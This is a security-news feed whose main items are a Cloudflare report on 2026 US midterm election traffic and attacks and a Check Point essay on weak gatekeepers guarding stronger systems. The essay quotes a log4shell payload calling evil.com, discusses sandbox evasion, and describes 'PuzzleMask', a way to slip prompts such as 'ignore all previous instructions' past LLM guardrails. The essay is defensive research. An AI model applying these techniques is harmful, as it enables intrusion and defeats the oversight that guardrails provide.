item.title: Internet traffic and attacks during the 2026 U.S. midterm elections
item.description: On November 3, 2026 U.S. voters headed to the polls. Here’s what Cloudflare data across more than 1,400 protected sites tells us about Election Day Internet traffic and cyberattacks.
item.content:encoded:
Visitors to government election websites surged 363% on November 3, the date of the 2026 midterm elections in the United States. Across Cloudflare's election protection programs, we also detected a significant shift in the types and timing of cyberattacks throughout 2026.

Unlike what we saw in other recent elections, attackers focused on gaining access to internal systems and data, rather than knocking websites offline. Government election websites faced website vulnerability attempts 180 times more often than denial-of-service (DDoS) attacks, and at roughly ten times the rate of Cloudflare's broader customer base. We also found evidence of at least one attempt to exploit a recently disclosed critical PHP vulnerability on a state government voting website in the Western United States.

These attacks peaked in late October, several weeks before the election. Vulnerability exploit attempts climbed steadily throughout 2026: from 200,000 per day in January, to 2 million per day in October. However, on Election Day in the U.S., Cloudflare detected no escalation in attack volume and zero major DDoS incidents across protected election sites, marking a sharp contrast to other recent elections, such as in Moldova last year.

Our data regarding cyberattacks on election institutions came from organizations participating in Cloudflare's free cybersecurity programs: the Athenian Project, Cloudflare for Campaigns, and Project Galileo. Together, these initiatives helped protect more than 1,400 election-related websites during the 2026 U.S. midterm elections, including those belonging to state and local governments, candidates, political parties, voting-rights advocates, journalists, and civil society groups.

Cloudflare launched its first election protection program in 2016 after widespread reports of cyberattacks targeting the U.S. elections. A decade later, it is remarkable to see how far governments and campaigns have come in securing their digital infrastructure. We are proud to help protect democratic institutions and are encouraged that cyberattacks were once again not a disruptive factor in 2026.

In this post, we examine traffic and attacks observed against those organizations on Election Day, analyze the most common types of attacks of the 2026 cycle, and provide recommendations based on those findings.

Election Day: significant voter traffic, minimal attacks

Ordinary user traffic to state and local government election websites was higher on Election Day (November 3) than any other day in 2026. Traffic to those sites increased to approximately 602 million requests, up from 130 million on November 1. By comparison, traffic across the rest of Cloudflare’s global network rose by only 12% over the same period.

State and local government election websites provide authoritative information to voters on how to register, where to vote, and who won. Because of their critical role, these platforms are often targeted by those seeking to suppress voter turnout, disrupt the reporting of results, or steal sensitive information.

On Election Day itself, Cloudflare did not record a single significant distributed denial-of-service (DDoS) attack across any of its 1,400 election-related websites. The only significant DDoS attack occurred on November 2, targeting a candidate for the U.S. House of Representatives in California and totaled 520,000 requests. By comparison, the Moldovan Election Commission experienced more than 898 million malicious requests in a single 12-hour period on their Election Day in 2025, with attacks peaking at 324,333 requests per second.

Prior to Election Day: the most common attacks in the 2026 cycle

Website vulnerability scans were by far the most common attack observed by Cloudflare in the 2026 U.S. election cycle. In the 12 months leading up to the election, Cloudflare mitigated 392 million such attacks on government election websites alone.

Website vulnerability attacks exploit outdated or vulnerable website code to gain access to internal systems and data. For example, cross-site scripting attacks inject malicious code into web pages in order to capture administrator credentials or deface site content. SQL injection manipulates database queries allowing attackers to potentially extract voter records or alter data.

Phishing and other malicious emails targeting political campaigns protected by the company occurred at rates consistent with Cloudflare's broader network, but showed signs of sophistication. In the 90 days leading up to the election, 3.9% of emails sent to organizations participating in Cloudflare for Campaigns were identified as malicious, closely tracking the 4.8 percent baseline across other Cloudflare customers. However, nearly 42% of those malicious emails managed to bypass basic email authentication checks, such as verifying sender identity or preventing in-transit tampering. These threats were nonetheless identified by Cloudflare’s advanced phishing detection tools.

Although website vulnerabilities were the most common attack overall, for journalism and election-related civil society organizations, DDoS was the most common. Over the same 12-month period, Cloudflare mitigated over 10.8 billion DDoS requests targeting these groups. The largest single attack occurred on September 10, 2026, hitting a U.S.-based news organization with 3.04 billion requests. This pattern is consistent with Cloudflare research released earlier this year, which found that among all Project Galileo entities in 120 countries, DDoS were by far the most common attack seen, accounting for 81% of all attacks.

PHP vulnerability

On October 21, security researchers disclosed serious vulnerabilities (known as php2shell) in PHP, an open source back-end programming language used by 70% of the world's websites. The flaws reportedly could allow attackers to execute malicious code on vulnerable servers, expose customer data, or disrupt services. Cloudflare deployed Web Application Firewall (WAF) protections for all customers, prior to public disclosure of the vulnerability.

On October 22, Cloudflare's PHP defense was triggered more than 9,000 times on a state government election website in the Western U.S. This attack was only detected on one election-related site and appears to have been an isolated incident rather than part of a broader trend.

Recommendations

Cloudflare research consistently shows that individuals and organizations participating in democratic elections face significant risk of cyberattack. Data gathered during the 2026 U.S. midterm election suggests those attacks continue to evolve, occur throughout an election cycle and not only on Election Day, and can vary depending on the type of organization targeted.

Based on the recent cyberattack trends in the 2026 U.S. midterms and other elections, we make the following recommendations:  

  • Prepare for surges in user traffic. Legitimate voter interest can create traffic spikes that overwhelm unprepared infrastructure and make essential election websites inaccessible. Organizations should prepare scalable, efficient infrastructure to handle Election Day traffic increases without straining budgets or staff.  
  • Maintain security protections year-round, not just on Election Day. Cyberattacks targeting democratic institutions occur across the entire election cycle, not just around voting windows. Defensive postures must remain active continuously rather than treated as a short-term, seasonal measure.
  • Deploy automated defenses to counter rapid threats. AI has made it easier for attackers to find and exploit new vulnerabilities. Organizations should implement security services that update automatically, like managed rules, to ensure new protections deploy by default.

Ensuring voters have access to reliable information about elections not only helps encourage participation and deliver timely, accurate results, but also protects voter confidence in the democratic process itself. As more officials, more institutions, and the public increasingly rely on the Internet for those services, keeping that digital infrastructure stable, secure, and accessible becomes an essential civic priority.

State and local election offices, political campaigns, party organizations, journalists, and voting rights groups in need of cybersecurity services can access them from Cloudflare at no cost. Visit the Athenian Project (for state and local election websites), Cloudflare for Campaigns (for political campaigns), or Project Galileo (for civil society, democracy, and journalism organizations) to learn more about eligibility and sign up today.

item.title: 30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable
item.description:
Abstract We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see […]

The post 30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable appeared first on Check Point Research.
item.content:encoded:
Abstract

We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle [1], the Gatekeeper Asymmetry Doom principle states that:

If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

Examples

Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database.

If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how they are not powerful enough to parse HTML, they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task [2][3], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update [4], [5], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

  • Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.
  • The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing trusted adversarial input, then that is very bad, but out of scope for this discussion.
  • The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj.biz, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks [6] to catch Kwyjibo [7]. Attackers evolved to use concatenations of randomly generated dictionary words [8], [9], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation [10] (this is a rather watered-down version fit for the current format):

Suppose we manage a chatroom and, as [..] Digimon fans, we refuse to allow anyone in the chatroom to mention [anything to do with] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: Three weeks ago I went to see the movie 'Detective Pikachu', this will show up as Three weeks ago I went to see the movie 'Detective '. [..]

Someone posts gengar uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, Dracaufeu or Tortank, so we add support for foreign languages.

Everything goes well until one day someone posts [a message concerning the Pokémon Victini]. [Our list] doesn’t include Victini; it’s a new one [..] Begrudgingly, we set up a script that scrapes the Bulbapedia database for new characters, Pokémon, and other terms of art. [..]

At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of J*gglypuff and 4lakazam and Mew_two. We [..] implement a system that checks input for character similarities and word similarities to [blocked words]. Eventually [the filter censors someone’s actual username for incidentally being a well-known Pokémon character] and a great outcry pours forth from the community, decrying our [blanket blocking policy] [..]

As we mull this over, to our horror, the next day [a user appears to be posting messages containing pikachu, pokeball, etc. with impunity]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out [the original, unsanitized messages were pikapikachuchu, pokepokeballball, etc]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once pikachu was removed, pikapikachuchu became simply pikachu. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.

This works for two weeks, and then the pikachus start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called CHATSCRIPT, and people have been sending in CHATSCRIPT<"pika"+"chu">…

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle [11], [12]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with ${jndi:ldap://evil.com/malware}. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this [13]:

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing jndi:ldap. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit is_substring_in_dict the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty [14], [15].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game [16], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key [..] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

That article’s parting words include an ominous thinly veiled apology:

The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. [..]

These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays [..] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must inevitably exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

“Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer [17], [18] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we have to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

[..] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. [..] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as tesseract.

To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human incredulity to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

PuzzleMask Bypass for AI Guardrails

What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, the PuzzleMask technique:

PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

To put it more directly:

In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.

[..]

‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.

‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can sort of show you:

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

[..] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. [19] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four [..]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce self-assessment, a safety layer where the model acts as its own guardrail.

Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that targets are algorithms that on an input of length x can run for at least x² log(x²) steps, and gatekeepers are algorithms that on input of length x can run for at most x² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target T that will compute the correct classification for every input, but no gatekeeper G can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of perfect play, and the world is full of non-perfect play. This might be a good time to quote Frank Lantz’s Donkey Space [20]:

You can look at every game as a problem to be solved. We say a game is solved when we can describe how to play perfectly play from any position. Tic Tac Toe is solved. Connect Four is solved. Checkers is solved. [..]

But what does it mean to solve Rock Paper Scissors? It’s easy to articulate a strategy which will guarantee that you can’t be beaten, just pick randomly. When I say you “can’t be beaten” I don’t mean you’re guaranteed to win, I mean no-one can have any better strategy, there is no way of playing that will do better against you. But if you enter a RPS tournament and want to win, you should be able to do better than that. You should recognize when you’re up against a drunk dude who only throws Rock and adjust your strategy to take advantage of him. Then, when you’re up against someone throwing pure random you adjust back to random yourself to guarantee at least an even chance of winning.

[..]

This is the situation that Poker is in. It’s easy to imagine a “solved” version of simple forms of poker. And using this perfect strategy you could guarantee that no-one in the world can have an edge on you, no-one can outplay you. But that’s not the actual goal of Poker. [..] If you play “perfectly” against a drunk tourist, a fish, a donkey, you are throwing money away. So the real [..] problem of poker is this inference problem of recognizing what type of player you are up against and adjusting your play to maximize your edge against their strategy. [..]

Imagine all the possible strategies you could be up against plotted in a multidimensional space, over here is the “perfect” strategy, unexploitable, there’s nothing you can do against it but play it yourself. But all around it are the vast, diverse spectrum of sub-optimal strategies that people actually use. This is Donkeyspace, and your goal is to place your opponent as accurately as possible at a point in this space, and then maneuver yourself to the point that takes maximal advantage of him.

Now think about this carefully, and think about what most of malware is actually like, and how for instance the god-tier SolarWinds hack dropped consumer grade Cobalt Strike as its payload. Worrying about doom is healthy. Worrying about it to the exclusion of being grounded in the actual threat landscape is counter-productive. If a lot of malware could bypass a mitigation, but doesn’t, that’s still a win.

Worrying about gatekeeper asymmetry in a productive way

• Is this attack surface doomed?
• If it is:
◦ Do we have a feasible non-doomed gatekeeper we could pivot to?
◦ How doomed is it in practice, as opposed to theory? Does the inevitable exploit live in the wild right now, or just in some whitepaper, or not even that? How far off is it?
◦ How much can we narrow down the window of doom by squeezing the power of the gatekeeper?
◦ What’s our defense-in-depth plan for when it’s breached?

A lot of this responsibility falls to security vendors, particularly the Sisyphean toil of ‘narrowing down windows of doom’ (see: cleverer static analysis systems, more sandbox evasion hardening). This might be a good place to make a completely honest pitch for the motivation for a security vendor to be “AI first”: LLMs are powerful, in the sense of power that fuels gatekeeper asymmetry. They are vast neural networks that, in some setups, can keep to-do lists and conjure Turing-complete python scripts. Wielded in the right way, they can narrow down the window of doom a lot, in some cases to nothing. It is true that in some contexts an LLM, out of the box, is less powerful than the actual Right Algorithm for the Job, in which case one should at least hand the LLM some integration for invoking the Right Algorithm for the Job.

One way or the other, through the lens of gatekeeper asymmetry doom, we’ve seen one sense in which LLMs act like a normal technology, after all. For all their feats and sophistication, put a weak LLM in charge of guarding a stronger LLM, and doom still emerges, as it did with Log4Shell exploits before, and with malicious binaries before that. We’re left to wonder whether seeing LLMs obey the same laws of infosec physics we’ve always known is comforting or frightening.

[15] N. Miramirkhani, M. P. Appini, N. Nikiforakis, and M. Polychronakis, “Spotless Sandboxes: Evading Malware Analysis Systems Using Wear-and-Tear Artifacts,” in 2017 IEEE Symposium on Security and Privacy (SP), 2017, pp. 1009–1024. doi: 10.1109/SP.2017.42.

[16] B. Herzog, “The Cat and Mouse Game: Exploiting Statistical Weaknesses in Human Interaction Anti-Evasions.” [Online]. Available: https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/

item.title: France Is Blaming Iran for the Fridge Cyberattack
item.description:
Interesting:

U.S. intelligence agencies have recently reached a “low confidence” assessment that Iran was responsible for the attacks in France, according to three U.S. officials who spoke on the condition of anonymity to discuss sensitive intelligence. A “low confidence” assessment generally means that there is some intelligence that points in a certain direction but is fragmented, and that the assessment could change as more information is collected.

The agencies’ judgment on the French incidents linked those attacks to Iran generally and not to a specific group such as the Revolutionary Guards, two of the officials said. They added that Iran was also seen as probably responsible for other similar attacks around Europe, but that those investigations were in their early stages...

item.title: Treat Your Honeypot Analysis Like Code: Git, Pull Requests and a Human Gate for AI [Guest Diary], (Wed, Nov 18th)
item.description: [This is a Guest Diary by Kevin Truong, an ISC intern as part of the SANS.edu BACS program]
item.content:encoded:
